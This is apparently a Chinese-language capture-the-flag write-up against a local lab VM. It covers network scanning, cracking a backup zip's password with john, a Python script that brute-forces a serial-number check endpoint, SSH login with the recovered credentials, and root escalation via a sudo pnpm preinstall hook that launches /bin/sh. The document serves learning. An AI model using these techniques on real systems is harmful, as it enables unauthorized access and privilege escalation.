再接再厉！

![image-20250608114424427](https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/20250608114424653.webp)


看靶机ip

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo arp-scan -l
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.131 08:00:27:1f:68:e6       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:ed:18:9e       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.180 seconds (117.43 hosts/sec). 4 responded
                                                          
```

探测服务

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p22,8080 -sC -sV 192.168.205.131
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 23:44 EDT
Nmap scan report for 192.168.205.131
Host is up (0.00079s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0 (protocol 2.0)
8080/tcp open  http    Node.js Express framework
|_http-title: \xE5\xA4\xA7\xE5\x82\xBB\xE5\xAD\x90\xE5\xBA\x8F\xE5\x88\x97\xE5\x8F\xB7\xE9\xAA\x8C\xE8\xAF\x81\xE7\xB3\xBB\xE7\xBB\x9F
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 1 disallowed entry 
|_zip2john 2026bak.zip > ziphash
MAC Address: 08:00:27:1F:68:E6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.20 seconds
                                                                                 
```

看到8080有个2026bak.zip文件，拉下来

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ wget http://192.168.205.131:8080/2026bak.zip
--2025-06-07 23:46:14--  http://192.168.205.131:8080/2026bak.zip
Connecting to 192.168.205.131:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 676250 (660K) [application/zip]
Saving to: ‘2026bak.zip’

2026bak.zip                                  100%[=============================================================================================>] 660.40K  --.-KB/s    in 0.03s   

2025-06-07 23:46:14 (24.1 MB/s) - ‘2026bak.zip’ saved [676250/676250]

                            
```

尝试打开

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ 7z x 2026bak.zip                      

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 676250 bytes (661 KiB)

Extracting archive: 2026bak.zip
--
Path = 2026bak.zip
Type = zip
Physical Size = 676250

    
Enter password (will not be echoed):
```

要密码，john爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ zip2john 2026bak.zip > hash
ver 2.0 2026bak.zip/2026bak/ is not encrypted, or stored with non-handled compression type
ver 2.0 2026bak.zip/2026bak/app.js PKZIP Encr: TS_chk, cmplen=550, decmplen=1189, crc=398AEF6F ts=58E6 cs=58e6 type=8
ver 2.0 2026bak.zip/2026bak/package.json PKZIP Encr: TS_chk, cmplen=188, decmplen=269, crc=B3FD1F4B ts=51B7 cs=51b7 type=8
ver 2.0 2026bak.zip/2026bak/pnpm-lock.yaml PKZIP Encr: TS_chk, cmplen=6576, decmplen=16896, crc=8A30424C ts=95C7 cs=95c7 type=8
ver 2.0 2026bak.zip/2026bak/public/ is not encrypted, or stored with non-handled compression type
ver 2.0 2026bak.zip/2026bak/public/css/ is not encrypted, or stored with non-handled compression type
ver 2.0 2026bak.zip/2026bak/public/css/all.min.css PKZIP Encr: TS_chk, cmplen=22371, decmplen=102025, crc=3F9C99C5 ts=908D cs=908d type=8
ver 2.0 2026bak.zip/2026bak/public/index.html PKZIP Encr: TS_chk, cmplen=2337, decmplen=8708, crc=BA472F2A ts=6A60 cs=6a60 type=8
ver 2.0 2026bak.zip/2026bak/public/js/ is not encrypted, or stored with non-handled compression type
ver 2.0 2026bak.zip/2026bak/public/js/index.js PKZIP Encr: TS_chk, cmplen=2140, decmplen=7773, crc=51B509C2 ts=50FC cs=50fc type=8
ver 2.0 2026bak.zip/2026bak/public/js/md5.min.js PKZIP Encr: TS_chk, cmplen=1587, decmplen=3770, crc=ABC5E899 ts=A254 cs=a254 type=8
ver 2.0 2026bak.zip/2026bak/public/js/seedrandom.min.js PKZIP Encr: TS_chk, cmplen=924, decmplen=1631, crc=A32D162A ts=9BE5 cs=9be5 type=8
ver 2.0 2026bak.zip/2026bak/public/robots.txt PKZIP Encr: TS_chk, cmplen=117, decmplen=122, crc=707883A9 ts=4D0C cs=4d0c type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/ is not encrypted, or stored with non-handled compression type
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-brands-400.ttf PKZIP Encr: TS_chk, cmplen=122902, decmplen=210792, crc=B603F717 ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-brands-400.woff2 PKZIP Encr: TS_chk, cmplen=118720, decmplen=118680, crc=E0935466 ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-regular-400.ttf PKZIP Encr: TS_chk, cmplen=26762, decmplen=68064, crc=8BAA11E2 ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-regular-400.woff2 PKZIP Encr: TS_chk, cmplen=25494, decmplen=25472, crc=D76269F6 ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-solid-900.ttf PKZIP Encr: TS_chk, cmplen=173643, decmplen=426112, crc=43F15403 ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-solid-900.woff2 PKZIP Encr: TS_chk, cmplen=158282, decmplen=158220, crc=2F37E44A ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-v4compatibility.ttf PKZIP Encr: TS_chk, cmplen=5048, decmplen=10836, crc=56DA8271 ts=2BFC cs=2bfc type=8
ver 2.0 2026bak.zip/2026bak/public/webfonts/fa-v4compatibility.woff2 PKZIP Encr: TS_chk, cmplen=4813, decmplen=4796, crc=D4BF5069 ts=2BFC cs=2bfc type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ john --show hash                                     
2026bak.zip:123456789::2026bak.zip:2026bak/public/robots.txt, 2026bak/package.json, 2026bak/app.js, 2026bak/public/js/seedrandom.min.js, 2026bak/public/js/md5.min.js, 2026bak/public/js/index.js, 2026bak/public/index.html, 2026bak/public/webfonts/fa-v4compatibility.woff2:2026bak.zip

1 password hash cracked, 0 left
               
```

123456789的密码，解压

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ 7z x 2026bak.zip -p123456789          

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 676250 bytes (661 KiB)

Extracting archive: 2026bak.zip
--
Path = 2026bak.zip
Type = zip
Physical Size = 676250

    
Would you like to replace the existing file:
  Path:     ./2026bak/app.js
  Size:     0 bytes
  Modified: 2025-06-05 23:07:10
with the file from archive:
  Path:     2026bak/app.js
  Size:     1189 bytes (2 KiB)
  Modified: 2025-06-05 23:07:10
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? A

Everything is Ok       

Folders: 5
Files: 17
Size:       1165355
Compressed: 676250
                                           
```

看看目录结构

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cd 2026bak                   
                
┌──(kali㉿kali)-[/mnt/hgfs/gx/2026bak]
└─$ tree .    
.
├── app.js
├── package.json
├── pnpm-lock.yaml
└── public
    ├── css
    │   └── all.min.css
    ├── index.html
    ├── js
    │   ├── index.js
    │   ├── md5.min.js
    │   └── seedrandom.min.js
    ├── robots.txt
    └── webfonts
        ├── fa-brands-400.ttf
        ├── fa-brands-400.woff2
        ├── fa-regular-400.ttf
        ├── fa-regular-400.woff2
        ├── fa-solid-900.ttf
        ├── fa-solid-900.woff2
        ├── fa-v4compatibility.ttf
        └── fa-v4compatibility.woff2

5 directories, 17 files
                 
```

先看app.js

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/2026bak]
└─$ cat app.js                                
const express = require('express');
const path = require('path');

const app = express();
const port = process.env.PORT || 8080;

// 解析 JSON 请求体
app.use(express.json());

// 静态文件服务
app.use(express.static('public'));

// /checkSN 路由 (POST请求)
app.post('/checkSN', (req, res) => {
    // 从请求体中获取 SN 参数
    const sn = req.body.sn;

    if (sn) {
        if (sn === "xxxxxxxxxxxxxxxxxxxxxxxxx") {
            res.json({
                code: 200,
                data: "xxxxxx:XXXXX",
                msg: 'Success: Valid SN '
            });
        } else {
            res.json({
                code: 401,
                data: null,
                msg: 'Error: Invalid SN'
            });
        }
    } else {
        res.status(400).json({
            code: 400,
            data: null,
            msg: 'Missing sn parameter in request body'
        });
    }
});
app.use((req, res) => {
    res.status(404).json({
        code: 404,
        data: null,
        msg: '404 Not Found'
    });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});                                                                                                                                                                                   
```

解析某些字符，然后以POST请求发送到/checkSN

继续看，看public/js/index.js

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/2026bak]
└─$ cat public/js/index.js 
document.addEventListener('DOMContentLoaded', function () {
    const snInput = document.getElementById('sn-input');
    const verifyBtn = document.getElementById('verify-btn');
    const responseText = document.getElementById('response-text');
    const statusIcon = document.getElementById('status-icon');
    function cleanInput(value) {
        return value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
    }
    function formatSerialNumber(value) {
        let cleanValue = cleanInput(value);
        let formatted = '';
        for (let i = 0; i < cleanValue.length; i++) {
            if (i > 0 && i % 5 === 0) {
                formatted += '-';
            }
            formatted += cleanValue[i];
        }
        return formatted;
    }
    snInput.addEventListener('input', function () {
        const startPos = snInput.selectionStart;
        const formattedValue = formatSerialNumber(snInput.value);
        snInput.value = formattedValue;
        let newPos = startPos;
        if (startPos === 6 || startPos === 12 || startPos === 18 || startPos === 24) {
            newPos = startPos + 1;
        }
        snInput.setSelectionRange(newPos, newPos);
    });
    snInput.addEventListener('keypress', function (e) {
        if (e.key === 'Enter') {
            verifySerialNumber();
        }
    });

    verifyBtn.addEventListener('click', verifySerialNumber);
    function verifySerialNumber() {
        const serialNumber = cleanInput(snInput.value);
        statusIcon.className = 'status-icon pending';
        statusIcon.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i>';
        responseText.textContent = "验证中，请稍候...";
        if (serialNumber.length !== 25) {
            statusIcon.className = 'status-icon error';
            statusIcon.innerHTML = '<i class="fas fa-exclamation-triangle"></i>';
            responseText.textContent = '错误: 序列号长度不正确 (需要25个字符)';
            return;
        }
        let hashSN = CreatehashSN(snInput.value);
        // console.log("hashSN:", hashSN);

        setTimeout(function () {
            fetch('/checkSN', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ sn: hashSN })
            })
                .then(response => response.json())
                .then(data => {
                    console.log("checkSN response:", data);
                    if (data.code === 200) {
                        statusIcon.className = 'status-icon success';
                        statusIcon.innerHTML = '<i class="fas fa-check-circle"></i>';
                        responseText.innerHTML = `序列号 <strong>${snInput.value}</strong> <br>验证成功！<br> ${data.data}`;
                    }
                    else {
                        statusIcon.className = 'status-icon error';
                        statusIcon.innerHTML = '<i class="fas fa-times-circle"></i>';
                        responseText.innerHTML = `序列号 <strong>${snInput.value}</strong> 验证失败！<br>状态: 无效或已被使用`;
                    }
                });
        }, 300);
    }
});

// 随机数生成函数（使用Math.seedrandom）
function R(seed, min = 100, max = 200) {
    // const rng = new Math.seedrandom(seed);
    // // return Math.floor(rng() * (max - min + 1)) + min;
    // return Math.floor((max - min + 1)) + min;
    return seed + min + max;
}
function CreatehashSN(SN) {
    // if(SN.length!== 29)
    // {
    //     return "序列号长度不正确 (需要25个字符)";
    // }
    console.log("SN", SN);
    const VI = "Jkdsfojweflk0024564555*";
    const KEY = "6K+35LiN6KaB5bCd6K+V5pq05Yqb56C06Kej77yM5LuU57uG55yL55yL5Yqg5a+G5rqQ5Luj56CB44CC";

    let a = [];
    let b = [];
    let e = [];
    let f = [];
    let z = [];

    // 处理SN字符串
    for (let i = 0; i < SN.length; i++) {
        const charCode = SN.charCodeAt(i);

        if (i >= 0 && i <= 4) {
            a.push(R(charCode));
            b.push(R(charCode));
            e.push(R(charCode));
            f.push(R(charCode));
            z.push(R(charCode));
        }
        if (i >= 5 && i <= 9) {
            b.push(R(charCode));
            e.push(R(charCode));
            f.push(R(charCode));
            z.push(R(charCode));
        }
        if (i >= 10 && i <= 14) {
            e.push(R(charCode));
            f.push(R(charCode));
            z.push(R(charCode));
        }
        if (i >= 15 && i <= 19) {
            f.push(R(charCode));
            z.push(R(charCode));
        }
        if (i >= 20 && i <= 24) {
            z.push(R(charCode));
        }
    }
    // console.log("a", a);
    // console.log("b", b);
    // console.log("e", e);
    // console.log("f", f);
    // console.log("z", z);
    // e = Math.max(f, g);
    if (a[0] > a[2] || a[1] > a[3]) {
        a[0] = Math.max(a[0], a[1], a[2], a[3], a[4]);
    } else {
        a[0] = Math.min(a[0], a[1], a[2], a[3], a[4]);
    }
    if (b[4] > b[6]) {
        b[0] = Math.max(b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);
    } else {
        b[0] = Math.min(b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);
    }
    if (e[8] > e[10] || e[9] > e[11]) {
        e[0] = Math.max(e[0], e[1], e[2], e[3], e[4], e[5], e[6], e[7], e[8], e[9], e[10], e[11]);
    } else {
        e[0] = Math.min(e[0], e[1], e[2], e[3], e[4], e[5], e[6], e[7], e[8], e[9], e[10], e[11]);
    }
    if (f[0] > f[10]) {
        f[0] = Math.max(f[0], f[1], f[2], f[3], f[4], f[5], f[6], f[7], f[8], f[9], f[10], f[11], f[12], f[13], f[14], f[15], f[16], f[17], f[18], f[19]);
    } else {
        f[0] = Math.min(f[0], f[1], f[2], f[3], f[4], f[5], f[6], f[7], f[8], f[9], f[10], f[11], f[12], f[13], f[14], f[15], f[16], f[17], f[18], f[19]);
    }
    if (z[15] > z[17] || z[18] > z[24]) {
        z[0] = Math.max(z[0], z[1], z[2], z[3], z[4], z[5], z[6], z[7], z[8], z[9], z[10], z[11], z[12], z[13], z[14], z[15], z[16], z[17], z[18], z[19], z[20], z[21], z[22], z[23], z[24]);
    } else {
        z[0] = Math.min(z[0], z[1], z[2], z[3], z[4], z[5], z[6], z[7], z[8], z[9], z[10], z[11], z[12], z[13], z[14], z[15], z[16], z[17], z[18], z[19], z[20], z[21], z[22], z[23], z[24]);
    }
    // console.log("a[0]", a[0]);
    // console.log("b[0]", b[0]);
    // console.log("e[0]", e[0]);
    // console.log("f[0]", f[0]);
    // console.log("z[0]", z[0]);
    let sum = 0;
    for (let i = 0; i < a.length; i++) {
        sum += a[i]
    }
    // console.log("sum", sum);
    a[0] = (sum ^ a[0]) % 12;
    a[0] = KEY.charAt(a[0]);

    for (let i = 0; i < b.length; i++) {
        sum += b[i]
    }
    // console.log("sum", sum);
    b[0] = (sum ^ b[0]) % 9;
    b[0] = KEY.charAt(b[0]);

    for (let i = 0; i < e.length; i++) {
        sum += e[i]
    }
    // console.log("sum", sum);

    e[0] = (sum ^ e[0]) % 8;
    e[0] = KEY.charAt(e[0]);


    for (let i = 0; i < f.length; i++) {
        sum += f[i]
    }
    // console.log("sum", sum);
    f[0] = (sum ^ f[0]) % 7;
    f[0] = KEY.charAt(f[0]);

    for (let i = 0; i < z.length; i++) {
        sum += z[i]
    }
    // console.log("sum", sum);
    z[0] = (sum ^ z[0]) % 6;
    z[0] = VI.charAt(z[0]);

    // console.log("a[0]", a[0]);
    // console.log("b[0]", b[0]);
    // console.log("e[0]", e[0]);
    // console.log("f[0]", f[0]);
    // console.log("z[0]", z[0]);
    let hashSN = md5(a[0] + b[0] + e[0] + f[0] + z[0]);
    // console.log("hashSN", hashSN);
    return hashSN;
}
                                                               
```

他这hashSN有问题，是固定的量，爆破一下就好了

去网页抓个包

![image-20250608115935547](https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/20250608115936018.webp)

随便输点，抓包

```
POST /checkSN HTTP/1.1
Host: 192.168.205.131:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.205.131:8080/
Content-Type: application/json
Content-Length: 41
Origin: http://192.168.205.131:8080
Connection: keep-alive
Priority: u=4

{"sn":"4818799e57fe67c963b90a99f797beae"}
```

然后丢给AI吧，不想自己写

然后AI给的有点小问题，不显示每次爆破就算了，好像它爆破成功了也会继续爆破，自己改一下吧

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/2026bak]                                                                                                                                             
└─$ vim bp.py                                                                                                                                                               
┌──(kali㉿kali)-[/mnt/hgfs/gx/2026bak]
└─$ cat bp.py             
import hashlib
import json
import queue
import threading
import requests

KEY = "6K+35LiN6KaB5bCd6K+V5pq05Yqb56C06Kej77yM5LuU57uG55yL55yL5Yqg5a+G5rqQ5Luj56CB44CC"
VI = "Jkdsfojweflk0024564555*"

def generate_all_hashes():
    hashes = []
    for i1 in range(12):
        s1 = KEY[i1]
        for i2 in range(9):
            s2 = KEY[i2]
            for i3 in range(8):
                s3 = KEY[i3]
                for i4 in range(7):
                    s4 = KEY[i4]
                    for i5 in range(6):
                        s5 = VI[i5]
                        s = s1 + s2 + s3 + s4 + s5
                        md5_hex = hashlib.md5(s.encode()).hexdigest()
                        hashes.append(md5_hex)
    return hashes

def worker(q, result, url):
    headers = {'Content-Type': 'application/json'}
    while not result and not q.empty():
        try:
            hash_sn = q.get_nowait()
            data = json.dumps({"sn": hash_sn})
            response = requests.post(url, headers=headers, data=data, timeout=5)
            if response.status_code == 200:
                try:
                    resp_data = response.json()
                    if resp_data.get('code') == 200:
                        result.append(hash_sn)
                        print(f"[+] Success! Found Valid SN: {hash_sn}")
                        return
                    else:
                        print(f"[-] Failed: {hash_sn} -> {resp_data.get('msg', 'Unknown error')}")
                except json.JSONDecodeError:
                    print(f"[-] Failed (Invalid JSON): {hash_sn}")
            else:
                print(f"[-] Failed (HTTP {response.status_code}): {hash_sn}")
        except Exception as e:
            print(f"[!] Error with {hash_sn}: {str(e)}")
        finally:
            q.task_done()

if __name__ == "__main__":
    SERVER_URL = "http://192.168.205.131:8080/checkSN"
    all_hashes = generate_all_hashes()
    print(f"Generated {len(all_hashes)} hashes. Starting爆破...")

    task_queue = queue.Queue()
    for h in all_hashes:
        task_queue.put(h)

    valid_hash = []
    num_threads = 8
    threads = []

    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(task_queue, valid_hash, SERVER_URL))
        t.daemon = True
        t.start()
        threads.append(t)

    task_queue.join()

    if valid_hash:
        print(f"[+] Valid hashSN found: {valid_hash[0]}")
    else:
        print("[-] No valid hashSN found.")
                                                                     
┌──(kali㉿kali)-[/mnt/hgfs/gx/2026bak]
└─$ python3 $_
Generated 36288 hashes. Starting爆破...
[-] Failed: 7e761b3333f90f1adb4b2bdb0192256f -> Error: Invalid SN
省略
[+] Success! Found Valid SN: ee5a82db0f9bf1c1903821477e11c067
```

SN: ee5a82db0f9bf1c1903821477e11c067，我们试一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/2026bak]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"sn": "ee5a82db0f9bf1c1903821477e11c067"}' http://192.168.205.131:8080/checkSN
{"code":200,"data":"welcome:DPKU9-8APJ9-8XZJ0-8XZ08-7H111","msg":"Success: Valid SN "}                                                                                      
```

登录

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/2026bak]
└─$ ssh welcome@192.168.205.131
The authenticity of host '192.168.205.131 (192.168.205.131)' can't be established.
ED25519 key fingerprint is SHA256:xJ90oWmr5sPR2afHz9etzSdtxINmLI+JvbwgV/iCsWY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:16: [hashed name]
    ~/.ssh/known_hosts:17: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.131' (ED25519) to the list of known hosts.
welcome@192.168.205.131's password: 
=============================
Welcome!!!
QQ Group:660930334
=============================
lingdong:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

找信息

```
lingdong:~$ sudo -l
Matching Defaults entries for welcome on lingdong:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for welcome:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User welcome may run the following commands on lingdong:
    (ALL : ALL) NOPASSWD: /root/.local/share/pnpm/global-bin/pm2
    (ALL : ALL) NOPASSWD: /usr/bin/pnpm
```

看有没有现成的

没找到，看看帮助文档

```
lingdong:~$ sudo /usr/bin/pnpm --help
Version 10.11.1 (compiled to binary; bundled Node.js v20.11.1)
Usage: pnpm [command] [flags]
       pnpm [ -h | --help | -v | --version ]

Manage your dependencies:
      add                  Installs a package and any packages that it depends on. By default, any new package is installed as a prod dependency
      import               Generates a pnpm-lock.yaml from an npm package-lock.json (or npm-shrinkwrap.json) file
   i, install              Install all dependencies for a project
  it, install-test         Runs a pnpm install followed immediately by a pnpm test
  ln, link                 Connect the local project to another one
      prune                Removes extraneous packages
  rb, rebuild              Rebuild a package
  rm, remove               Removes packages from node_modules and from the project's package.json
      unlink               Unlinks a package. Like yarn unlink but pnpm re-installs the dependency after removing the external link
  up, update               Updates packages to their latest version based on the specified range

Review your dependencies:
      audit                Checks for known security issues with the installed packages
      licenses             Check licenses in consumed packages
  ls, list                 Print all the versions of packages that are installed, as well as their dependencies, in a tree-structure
      outdated             Check for outdated packages

Run your scripts:
      exec                 Executes a shell command in scope of a project
      run                  Runs a defined package script
      start                Runs an arbitrary command specified in the package's "start" property of its "scripts" object
   t, test                 Runs a package's "test" script, if one was provided

Other:
      cat-file             Prints the contents of a file based on the hash value stored in the index file
      cat-index            Prints the index file of a specific package from the store
      find-hash            Experimental! Lists the packages that include the file with the specified hash.
      pack                 Create a tarball from a package
      publish              Publishes a package to the registry
      root                 Prints the effective modules directory

Manage your store:
      store add            Adds new packages to the pnpm store directly. Does not modify any projects or files outside the store
      store path           Prints the path to the active store directory
      store prune          Removes unreferenced (extraneous, orphan) packages from the store
      store status         Checks for modified packages in the store

Options:
  -r, --recursive          Run the command for each project in the workspace.
```



看着有点像npm啊，这玩意和npm差不多吧？试试

![image-20250608122239857](https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/20250608122240292.webp)

```
lingdong:~$ TF=$(mktemp -d)
lingdong:~$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
lingdong:~$ sudo pnpm -C $TF --unsafe-perm i
Already up to date

> @ preinstall /tmp/tmp.ggFJFL
> /bin/sh

/tmp/tmp.ggFJFL # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

可以，拿一下flag

```
/tmp/tmp.ggFJFL # cat /root/root.txt 
flag{root-b89ed76b27e91ad5d773ddadae256072}
/tmp/tmp.ggFJFL # cat /home/welcome/user.txt 
flag{user-afc8b494c5ba167971f10274f5a81534}
```